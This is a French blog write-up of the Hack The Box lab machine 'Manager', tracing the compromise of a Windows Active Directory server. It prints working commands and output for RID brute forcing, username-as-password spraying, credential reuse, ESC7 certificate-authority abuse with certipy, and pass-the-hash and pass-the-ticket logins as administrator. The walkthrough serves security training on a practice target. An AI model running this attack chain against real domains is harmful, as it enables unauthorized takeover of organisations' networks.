---
date: 2024-03-15T22:14:37-05:00
# description: ""
image: "/images/HTB-Manager/Manager.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Manager"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Manager](https://app.hackthebox.com/machines/Manager)
* Niveau: Moyen
* OS: Windows
---

Manager présente un serveur Windows 2019 utilisant Active Directory et une base de données MSSQL en plus de quelques services tels que MSRPC et HTTP. La cible est vulnérable au brute forcing RID et à l'ESC7 ( Vulnerable Certificate Authority Access Control).

L'adresse IP cible est `10.10.11.236`

## Balayage (Scanning)

J'identifie d'abord tous les ports ouverts.

```
nmap 10.10.11.236 -p- -T4 -Pn --open
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 13:38 CDT
Nmap scan report for 10.10.11.236
Host is up (0.048s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49671/tcp open  unknown
49727/tcp open  unknown
57702/tcp open  unknown
58902/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 107.12 seconds
```

J'utilise un autre scan pour obtenir plus d'informations sur les différents services.

```
nmap -sC -sV --open 10.10.11.236
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 13:46 CDT
Nmap scan report for 10.10.11.236
Host is up (0.048s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-14 01:45:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-06T12:01:23
|_Not valid after:  2054-03-06T12:01:23
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-14T01:46:19
|_  start_date: N/A
|_clock-skew: mean: 6h58m40s, deviation: 0s, median: 6h58m39s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.25 seconds
```

Tous les services et ports nécessaires pour un environnement AD (Active Directory) sont présents. Je remarque le contrôleur de domaine `manager.htb` et je l'ajoute au fichier `/etc/hosts`.

```
sudo echo "10.10.11.236 manager.htb" | sudo tee -a /etc/hosts
```

## Enumération

Le site web n'offre rien de particulier, il s'agit d'un site web statique sans aucune fonctionnalité.

![Manager-Website](/images/HTB-Manager/website.png)

Gobuster n'apporte rien de valable non plus.

J'essaie ensuite d'énumérer SMB. Je peux y accéder en tant qu'invité, mais toujours rien d'intéressant.

```
smbmap -H 10.10.11.236 -u guest
```

![SMB-guest-login](/images/HTB-Manager/smb-guest.png)

Je sais qu'Active Directory est présent sur la cible donc je tente un RID brute forcing.

> RID signifie Relative Identifier (identifiant relatif). Il s'agit d'un identifiant unique attribué à chaque objet (tel que les utilisateurs, les groupes et les ordinateurs) au sein d'un domaine Windows. Le RID brute forcing, également connu sous le nom de RID cycling ou RID enumeration, est une technique utilisée par les attaquants pour identifier les comptes d'utilisateurs valides au sein d'un domaine Windows en devinant les valeurs du RID.

```
crackmapexec smb manager.htb -u guest -p '' --rid-brute
```

![RID-Brute-forcing](/images/HTB-Manager/rid-bruteforcing.png)

Je ne veux que les lignes avec des noms d'utilisateur, je les copie donc dans un fichier (à partir de l'utilisateur `Zhong`).

![Users-from-RID-brute-forcing](/images/HTB-Manager/smb-list.png)

J'en extrais les noms d'utilisateurs et je les garde dans un autre fichier.

```
awk -F': ' '{split($NF, a, "\\"); split(a[2], b, " "); print tolower(b[1])}' smb-output.txt > smb-users.txt
```

![Domain-users-list](/images/HTB-Manager/smb-users.png)

Essayons de trouver les comptes qui utilisent leur nom d'utilisateur comme mot de passe.

```
crackmapexec smb manager.htb -u $(cat ~/Machines/HTB/Manager/smb-users.txt) -p $(cat ~/Machines/HTB/Manager/smb-users.txt) --continue-on-success
```

La paire `operator:operator` est un succès!

![SMB-login-credentials](/images/HTB-Manager/smb-login.png)

Il n'y a pas de partages accessibles avec cet utilisateur, je porte mon attention sur la base de données MSSQL.

```
crackmapexec mssql manager.htb -u operator -p operator
```

Il s'avère que je peux accéder à la base de données avec les mêmes identifiants smb.

![MSSQL-login-credentials](/images/HTB-Manager/MSSQL-login.png)

```
impacket-mssqlclient operator:operator@dc01.manager.htb -windows-auth
```
![MSSQL-database-accessed](/images/HTB-Manager/MSSQL-ACCESS.png)

J'essaie d'activer `xp_cmdshell` mais cela échoue.

> `xp_cmdshell` est une fonctionnalité de Microsoft SQL Server qui permet aux utilisateurs d'exécuter des commandes des commandes pour interagir avec le système d'exploitation depuis SQL Server.

![xp-cmdshell-failure](/images/HTB-Manager/xp-cmdshell.png)

Je liste le contenu de la base de données avec `xp_dirtree`, la racine web de Microsoft IIS se trouve à `C:\inetpub\wwwroot`.

```
xp_dirtree C:\inetpub\wwwroot
```

![MSSQL-database-accessed](/images/HTB-Manager/xp_dirtree.png)

J'ai trouvé une archive appelée `website-backup-27-07-23-old.zip` que je télécharge avec `wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip`.

Après l'avoir décompressé, je remarque un fichier caché appelé `.old-conf.xml`.

![old-conf-xml-file](/images/HTB-Manager/xml-file.png)

Il contient les informations d'identification de l'utilisateur `raven`.

![raven-user-credentials](/images/HTB-Manager/raven-user-credentials.png)

## Accès initial

> Je sais d'après les résultats de nmap que le port `5985` était ouvert, ce port est typiquement utilisé pour le service `WinRM (Windows Remote Management)`.

Je parviens à accéder au système grâce aux identifiants de connexion trouvés précédemment.

```
evil-winrm -u raven -p 'R4v3nBe5tD3veloP3r!123' -i manager.htb
```
![Foothold-via-evil-WinRM](/images/HTB-Manager/foothold.png)

Le fichier `user.txt` se trouve à l'adresse `C:\Users\Raven\Desktop\user.txt`.

![Foothold-via-evil-WinRM](/images/HTB-Manager/user-flag.png)

J'énumère le système juste au cas où je devrais rechercher des vulnérabilités spécifiques à la version du système d'exploitation. Je le fais avec `get-computerinfo`.

![Target-system-info](/images/HTB-Manager/computerinfo.png)

Sachant que je suis dans un environnement Active Directory, je vérifie les droits d'accès des utilisateurs avec `certify`, le programme est disponible [ici](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).

![Principal-rights-enumeration](/images/HTB-Manager/CA-rights.png)

L'utilisateur `raven` a les droits de gérer l'autorité de certification (Certificate Authority). Il peut aussi demander et enregistrer des certificats auprès de l'autorité de certification.

L'autorité de certification (CA) utilisée est `manager-DC01-CA`.

![Certificate-Authority-information](/images/HTB-Manager/certutil.png)

## Escalade des privilèges

L'exploitation de la vulnérabilité du certificat (ESC7) est expliquée en détail [ici](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2).

> "La technique repose sur le fait que les utilisateurs ayant le droit d'accès `Manage CA` et `Manage Certificates` peuvent émettre des requêtes de certificats qui ont échoué. Le modèle de certificat `SubCA` est vulnérable à l'ESC1, mais seuls les administrateurs peuvent s'inscrire dans le modèle. Ainsi, un utilisateur peut demander à s'inscrire dans le `SubCA` - ce qui sera refusé - mais ensuite délivré par le manager".

1. Vous vous accordez le droit d'accès `Manage Certificates` en ajoutant l'utilisateur en tant que nouvel "officer".

```
certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -add-officer raven
```

![Add-officer-Raven](/images/HTB-Manager/CA1.png)

2. Le template `SubCA` peut être **activé sur l'AC** avec le paramètre `-enable-template`.

```
certipy ca -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca 'manager-DC01-CA' -enable-template 'SubCA'
```

![Enable-SubCA](/images/HTB-Manager/CA2.png)

3. Nous commençons par demander un certificat basé sur le template SubCA. Cette demande sera refusée, mais nous enregistrerons la clé privée et noterons l'identifiant de la demande. Assurez-vous que vous exécutez la commande à partir d'un répertoire où vous avez des droits d'écriture, sinon le fichier `.key` ne sera pas enregistré.

```
certipy req -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -template SubCA -upn administrator@manager.htb
```

![Certificate-private-key](/images/HTB-Manager/CA3.png)

4. Avec le `Request ID`, émettez un certificat. Vous le faites avec `-issue-request <request ID>`

```
certipy ca -ca 'manager-DC01-CA' -issue-request 24 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
```

![Certificate-issued-successfully](/images/HTB-Manager/CA4.png)

5. Récupérez le certificat émis avec la commande `req` et le paramètre `-retrieve <request ID>`.

```
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 24 -dc-ip 10.10.11.236
```

![Certificate-retrieved](/images/HTB-Manager/CA5.png)

6. L'exécution des commandes suivantes nécessitera une synchronisation d'horloge avec le contrôleur de domaine (DC). Pour que cela fonctionne, nous pouvons utiliser `ntpdate`.

> Cette étape est très sensible au temps, vous devez exécuter ces commandes rapidement. Si vous n'y arrivez pas, je vous recommande d'enchaîner les commandes après avoir exécuté `sudo ntpdate -u manager.htb`.

Si les commandes ne sont pas exécutées assez rapidement, cette erreur se produit.

![Clock-skew-error](/images/HTB-Manager/Clock-error.png)

Utilisez la commande ci-dessous et exécutez immédiatement la seconde commande avec `certipy auth`.

```
sudo ntpdate -u manager.htb
```

![ntpdate-clock-sync](/images/HTB-Manager/CLOCK-SYNC.png)

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

Nous obtenons un ticket TGT et le hash de l'administrateur. Les deux peuvent être utilisés pour obtenir des privilèges administrateurs. Vous pouvez vous connecter avec le hash en utilisant `evil-winrm` ou vous pouvez passer le ticket avec `impacket`.

![TGT-Ticket-and-admin-hash](/images/HTB-Manager/CA6.png)

### Méthode evil-winrm

```
evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
```

![admin-shell-evil-WinRM](/images/HTB-Manager/evil-winrm-root.png)

### Passer le ticket (Pass the ticket Attack) 

> Cette méthode est sujette à l'erreur `Kerberos SessionError : KRB_AP_ERR_SKEW(Clock skew too great)`, vous devrez réutiliser la commande `ntpdate` avant d'utiliser `impacket`.

Pour passer le ticket, je dois d'abord l'exporter. Vous trouverez plus d'informations [ici](https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate).

```
export KRB5CCNAME=administrator.ccache
```

Je me connecte ensuite au contrôleur de domaine (DC)

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
```

Et nous sommes en possession d'un compte privilégié!

![Impacket-privileged-account](/images/HTB-Manager/CA7.png)

### Méthode des commandes en chaîne

Enchaîner les commandes peut être la solution pour vous si vous n'arrivez pas à les exécuter assez rapidement individuellement. Cependant, vous aurez probablement besoin d'essayer plusieurs fois.

```
sudo ntpdate -u manager.htb
```

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 && export KRB5CCNAME=administrator.ccache && python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
```

![ESC7-with-chained-commands](/images/HTB-Manager/CA-chain-cmds.png)

Le fichier `root.txt` se trouve à `c:\Users\Administrator\Desktop`

![root-flag](/images/HTB-Manager/root-flag.png)

C'est tout pour cette machine, j'espère que ce article vous aura été utile! Je compte explorer d'autres platformes de hacking bientôt telles que Hackviser et HackMyVM. Restez à l'écoute et n'hésitez pas à me contacter sur X à [@_KScorpio](https://twitter.com/_KScorpio).
